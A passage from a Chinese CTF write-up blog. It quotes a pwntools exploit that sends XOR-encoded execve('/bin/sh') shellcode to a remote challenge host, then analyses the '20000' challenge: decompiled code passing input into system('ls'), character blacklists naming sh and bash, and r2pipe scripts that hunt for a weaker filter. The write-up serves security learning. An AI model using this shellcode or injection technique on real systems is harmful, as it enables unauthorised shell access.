href="https://gist.github.com/Jinmo/ac77fa58ff7e61b239637850ac869d8b" target="_blank" rel="noopener">å¤§ä½¬çš„exp</a>å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'110.10.147.104'</span>, <span class="number">13152</span>)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'''</span></span><br><span class="line"><span class="string">1 lOv3 1 2</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">1 D0l1 1</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">2 1 HuNgRYT1m3</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">1 2</span></span><br><span class="line"><span class="string">F0uRS3aS0n 1 1</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">    /* execve(path='/bin///sh', argv=['sh'], envp=0) */</span></span><br><span class="line"><span class="string">    /* push '/bin///sh\x00' */</span></span><br><span class="line"><span class="string">    push 0x68</span></span><br><span class="line"><span class="string">    xor eax, eax</span></span><br><span class="line"><span class="string">    mov rax, 0x732f2f2f6e69622f</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    /* push argument array ['sh\x00'] */</span></span><br><span class="line"><span class="string">    /* push 'sh\x00' */</span></span><br><span class="line"><span class="string">    push 0x1010101 ^ 0x6873</span></span><br><span class="line"><span class="string">    xor dword ptr [rsp], 0x1010101</span></span><br><span class="line"><span class="string">    xor esi, esi /* 0 */</span></span><br><span class="line"><span class="string">    push rsi /* null terminate */</span></span><br><span class="line"><span class="string">    push 8</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    add rsi, rsp</span></span><br><span class="line"><span class="string">    push rsi /* 'sh\x00' */</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    xor edx, edx /* 0 */</span></span><br><span class="line"><span class="string">    /* call execve() */</span></span><br><span class="line"><span class="string">    push SYS_execve /* 0x3b */</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">xorkey = [ord(x) ^ ord(y) <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(<span class="string">'\x13x\xfc\xb7\x1b\xb0\x8ds\xb9\x13\xba\xb9\x00\xaa\xdaf\x95\xda&#125;\x9e\x02\xb90\xbe\xd8&amp;\x1f\t\x10n\xcdu\x89S\x83\xbad jNF\xbb`#\t\x13a\xd8u\x96G\xe0\xfcW5iAS\xbb&#123;"jUR\xd8v\x95R\xe0\xe7Ci/rS\xb8t\x04jNF\xbb0\xa2R\xe3\xe8V|4f0\xfeG\x19iAS\xbb+\xaa1\xa5\xdbV\x0c;s0\xd1\x86t5R\xbb\xc5\x92\xac\xcf\xd1\xa6t5R\xbb\xdf\x92\xac\xcf\xe5&#123;\x15/rS\xb8THjNF\xbbxC\t\x13a\xd8%i\x1c\x10u\xd9V\xce8s0/\xcf\xc94\xdb\xa3\xba\xa7\xec T\x060\xcdRS3a\xbb\xda\x9e\xb9\xcf\xcdRS3a\xbbI\x90\xb9\xcf'</span>, asm(shellcode))]</span><br><span class="line">xorkey = bytearray(xorkey)</span><br><span class="line"><span class="keyword">print</span> hexdump(xorkey)</span><br><span class="line"><span class="keyword">assert</span> all(x <span class="keyword">not</span> <span class="keyword">in</span> str(xorkey) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">'\x00 \r\r\n\t'</span>)</span><br><span class="line">payload = (<span class="string">'AAAAAAWTQJMJXTSPPZVCIDGQYRDINMCP'</span>).ljust(<span class="number">0xc0</span>, <span class="string">'\x00'</span>) + xorkey + <span class="string">'\x00'</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="20000"><a href="#20000" class="headerlink" title="20000"></a>20000</h1><p>ç»™äº†ä¸€ä¸ª64ä½çš„elfè¿˜æœ‰20000ä¸ª<code>.so</code>æ–‡ä»¶ã€‚æ‹–è¿›idaçœ‹åˆ°mainå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *v5; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> number; <span class="comment">// [rsp+Ch] [rbp-94h]</span></span><br><span class="line">  <span class="keyword">void</span> (__fastcall *v8)(<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *); <span class="comment">// [rsp+10h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">void</span> *handle; <span class="comment">// [rsp+18h] [rbp-88h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+20h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+80h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [rsp+84h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v13; <span class="comment">// [rsp+88h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  backgroud();</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"INPUT : "</span>, <span class="number">0L</span>L, &amp;v12);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;number);</span><br><span class="line">  <span class="keyword">if</span> ( number &lt;= <span class="number">0</span> &amp;&amp; number &gt; <span class="number">20000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Invalid Input"</span>, &amp;number);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">"./20000_so/lib_%d.so"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)number);</span><br><span class="line">  handle = dlopen(&amp;s, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( handle )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = handle;</span><br><span class="line">    v8 = (<span class="keyword">void</span> (__fastcall *)(<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *))dlsym(handle, <span class="string">"test"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8(v5, <span class="string">"test"</span>);</span><br><span class="line">      dlclose(handle);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = dlerror();</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Error: %s\n"</span>, v6);</span><br><span class="line">      dlclose(handle);</span><br><span class="line">      result = <span class="number">1L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = dlerror();</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Error: %s\n"</span>, v3);</span><br><span class="line">    result = <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¨‹åºè¦æ±‚æˆ‘ä»¬è¾“å…¥ä¸€ä¸ª<code>0ï½20000</code>ä¹‹é—´çš„æ•°å­—ï¼Œç„¶åä¼šè¯»å–ä»»æ„ä¸€ä¸ª<code>.so</code>æ–‡ä»¶ã€‚ä¸»è¦æ˜¯ä¸¤ä¸ªå‡½æ•°<a href="https://blog.csdn.net/kingkong1024/article/details/8474210" target="_blank" rel="noopener">dlopenå’Œdlsym</a>ï¼Œå‰è€…æ‰“å¼€åŠ¨æ€é“¾æ¥åº“ï¼Œå¹¶è¿”å›ä¸€ä¸ªå¥æŸ„ï¼›åè€…ç”¨æ¥æ‰“å¼€åŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°ã€‚</p><p>éšæœºæ‰“å¼€å‡ ä¸ª<code>.so</code>æ–‡ä»¶çœ‹çœ‹æœ‰ä»€ä¹ˆã€‚<code>lib_1139.so</code>ä¸­çœ‹åˆ°ä¸€ä¸ª<code>test()</code>å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> (__fastcall *v3)(<span class="keyword">char</span> *, <span class="keyword">char</span> *); <span class="comment">// [rsp+0h] [rbp-B0h]</span></span><br><span class="line">  <span class="keyword">void</span> (__fastcall *v4)(<span class="keyword">char</span> *); <span class="comment">// [rsp+8h] [rbp-A8h]</span></span><br><span class="line">  <span class="keyword">void</span> *handle; <span class="comment">// [rsp+10h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">void</span> *v6; <span class="comment">// [rsp+18h] [rbp-98h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+20h] [rbp-90h]</span></span><br><span class="line">  __int16 v8; <span class="comment">// [rsp+50h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+60h] [rbp-50h]</span></span><br><span class="line">  __int16 v10; <span class="comment">// [rsp+90h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v11; <span class="comment">// [rsp+98h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  handle = dlopen(<span class="string">"./20000_so/lib_17305.so"</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( handle )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *, <span class="keyword">char</span> *))dlsym(handle, <span class="string">"filter1"</span>);</span><br><span class="line">    v6 = dlopen(<span class="string">"./20000_so/lib_2850.so"</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = (<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *))dlsym(v6, <span class="string">"filter2"</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"This is lib_1139 file."</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"How do you find vulnerable file?"</span>);</span><br><span class="line">      read(<span class="number">0</span>, &amp;buf, <span class="number">0x32</span>uLL);</span><br><span class="line">      v3(&amp;buf, &amp;buf);</span><br><span class="line">      v4(&amp;buf);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;s, <span class="string">"ls \"%s\""</span>, &amp;buf);</span><br><span class="line">      system(&amp;s);</span><br><span class="line">      dlclose(handle);</span><br><span class="line">      dlclose(v6);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = dlerror();</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Error: %s\n"</span>, v2);</span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v0 = dlerror();</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Error: %s\n"</span>, v0);</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°æ˜¯è¯»å–è¾“å…¥ä½œä¸ºå‚æ•°æ¥æ‰§è¡Œ<code>ls</code>å‘½ä»¤ã€‚åœ¨<code>lib_12071.so</code>é‡Œæ‰¾åˆ°ä¸€ä¸ª<code>filter1()</code>å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *__<span class="function">fastcall <span class="title">filter1</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">';'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'*'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'|'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'&amp;'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'$'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'`'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'&gt;'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'&lt;'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  result = <span class="built_in">strchr</span>(a1, <span class="string">'r'</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ã€‚åœ¨<code>lib_9494.so</code>ä¸­è¿˜æœ‰ä¸€ä¸ª<code>filter2()</code>å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *__<span class="function">fastcall <span class="title">filter2</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'v'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'m'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'p'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'d'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'n'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a1, <span class="string">"bin"</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a1, <span class="string">"sh"</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a1, <span class="string">"bash"</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'f'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'l'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  result = <span class="built_in">strchr</span>(a1, <span class="string">'g'</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿæ˜¯è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ï¼Œè¿˜æœ‰<code>bash</code>å’Œ<code>sh</code>è¿™äº›å­—ä¸²ã€‚é‚£ä¹ˆåŸºæœ¬å¯ä»¥ç¡®è®¤æ‰€æœ‰çš„<code>.so</code>æ–‡ä»¶å¿…å®šåªåŒ…å«ç€ä¸‰ä¸ªæ ‡å¿—ã€‚æ¥ä¸‹æ¥ä¸»è¦æ˜¯åˆ†æ<code>.so</code>æ–‡ä»¶ä¸­çš„è¿™ä¸‰ä¸ªsymbolï¼š<code>test</code>ã€<code>filter1</code>ã€<code>filter2</code>ã€‚<code>test</code>æ˜¯mainå‡½æ•°ä¸­ä¼šè°ƒç”¨çš„ï¼Œfilteråˆ™æ˜¯åœ¨ä¸€äº›æ–‡ä»¶çš„<code>test()</code>ä¸­ä¼šè°ƒç”¨ï¼Œå…¶ä¸­<code>filter2()</code>æ˜¾ç„¶æ˜¯æœ€å…³é”®çš„ä¸€ä¸ªåœ°æ–¹ã€‚ç”¨<a href="https://github.com/radare/radare2-r2pipe" target="_blank" rel="noopener">r2pipe</a>æ¥å¯¹æ–‡ä»¶è¿›è¡Œåˆ†æï¼ˆ<a href="https://stackoverrun.com/cn/q/12470406" target="_blank" rel="noopener">å®‰è£…æ–¹æ³•</a>ï¼‰ï¼š</p><p>é¦–å…ˆéå†æ¯ä¸ªæ–‡ä»¶ï¼ŒæŸ¥æ‰¾å…¶ä¸­çš„ç¬¦å·å¹¶åŠ å…¥åˆ°åˆ—è¡¨ä¸­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> r2pipe</span><br><span class="line"></span><br><span class="line">test = []</span><br><span class="line">filter1 = []</span><br><span class="line">filter2 = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">20000</span>+<span class="number">1</span>):</span><br><span class="line">  <span class="keyword">print</span> i</span><br><span class="line">  r2 = r2pipe.open(<span class="string">'./20000_so/lib_&#123;&#125;.so'</span>.format(i))</span><br><span class="line">  <span class="keyword">if</span> <span class="string">'dlopen'</span> <span class="keyword">in</span> r2.cmd(<span class="string">'ii'</span>):</span><br><span class="line">    test.append(i)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">'filter1'</span> <span class="keyword">in</span> r2.cmd(<span class="string">'is'</span>):</span><br><span class="line">    filter1.append(i)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">'filter2'</span> <span class="keyword">in</span> r2.cmd(<span class="string">'is'</span>):</span><br><span class="line">    filter2.append(i)</span><br><span class="line">  r2.quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> test</span><br><span class="line"><span class="keyword">print</span> filter1</span><br><span class="line"><span class="keyword">print</span> filter2</span><br></pre></td></tr></table></figure><p>å…ˆæŸ¥æ‰¾ä¸€ä¸‹filter1æ¯ä¸ªæ–‡ä»¶çš„symbolæ˜¯å¦æœ‰ä¸åŒçš„åœ°æ–¹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> filter1:</span><br><span class="line">  r2 = r2pipe.open(<span class="string">'./20000_so/lib_&#123;&#125;.so'</span>.format(i))</span><br><span class="line">  r2.cmd(<span class="string">'aaa'</span>)</span><br><span class="line">  keys = [<span class="string">'0x3b'</span>, <span class="string">'0x2a'</span>, <span class="string">'0x7c'</span>, <span class="string">'0x26'</span>, <span class="string">'0x24'</span>, <span class="string">'0x60'</span>, <span class="string">'0x3e'</span>, <span class="string">'0x3c'</span>, <span class="string">'0x72'</span>]</span><br><span class="line">  out = r2.cmd(<span class="string">'pdf @ sym.filter1'</span>)</span><br><span class="line">  res = []</span><br><span class="line"></span><br><span class="line">  same = <span class="keyword">True</span></span><br><span class="line">  <span class="keyword">for</span> k <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> k <span class="keyword">not</span> <span class="keyword">in</span> out:</span><br><span class="line">      same = <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> same:</span><br><span class="line">    res.append(i)</span><br><span class="line">    <span class="keyword">print</span> str(i)</span><br><span class="line"></span><br><span class="line">  r2.quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'res: '</span>, res</span><br></pre></td></tr></table></figure><p><code>lib_4323.so</code>ä¸­çš„filter1ï¼Œä¸ä¹‹å‰ç›¸æ¯”å°‘è¿‡æ»¤äº†ä¸€ä¸ª<code>|</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 